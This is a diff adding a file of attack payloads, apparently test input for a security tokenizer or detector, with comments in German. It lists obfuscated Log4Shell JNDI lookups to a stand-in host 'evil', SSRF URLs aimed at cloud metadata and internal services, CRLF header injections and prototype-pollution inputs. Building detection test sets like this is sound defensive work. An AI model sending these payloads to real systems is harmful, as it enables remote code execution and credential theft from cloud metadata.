@@ -1,0 +1,35 @@
+# protocol-jndi-ssrf – Angriffs-Payloads (ein Payload pro Zeile; Kommentarzeilen beginnen mit #)
+# Hinweis: Platzhalter wie x-scr'ipt stehen für script-Varianten; der Tokenizer prüft die zusammengesetzten Formen.
+${jndi:ldap://evil/x}
+${jndi:rmi://evil/x}
+${${lower:j}ndi:ldap://evil/x}
+${jndi:${lower:l}${lower:d}ap://evil/x}
+${${::-j}${::-n}${::-d}${::-i}:ldap://evil/x}
+${jndi:dns://evil/x}
+http://169.254.169.254/latest/meta-data/
+http://127.0.0.1:8080/admin
+http://localhost/server-status
+http://[::1]/x
+http://0x7f000001/x
+http://2130706433/x
+http://metadata.google.internal/computeMetadata/v1/
+gopher://127.0.0.1:6379/_x
+dict://127.0.0.1:11211/stats
+http://10.0.0.1/internal
+http://192.168.1.1/
+http://169.254.169.254/
+file:///etc/hostname
+http://0177.0.0.1/
+http://169.254.169.254/latest/user-data
+x%0d%0aSet-Cookie:%20evil=1
+q=1%0d%0aContent-Length:%200
+http://100.100.100.200/
+${jndi:ldaps://evil:1389/a}
+http://user@169.254.169.254/
+http://2852039166/
+%0d%0a%0d%0aGET /admin HTTP/1.1
+__proto__[x]=1
+constructor[prototype][x]=1
+{"__proto__":{"x":1}}
+${env:USER}
+jndi:ldap://evil/x
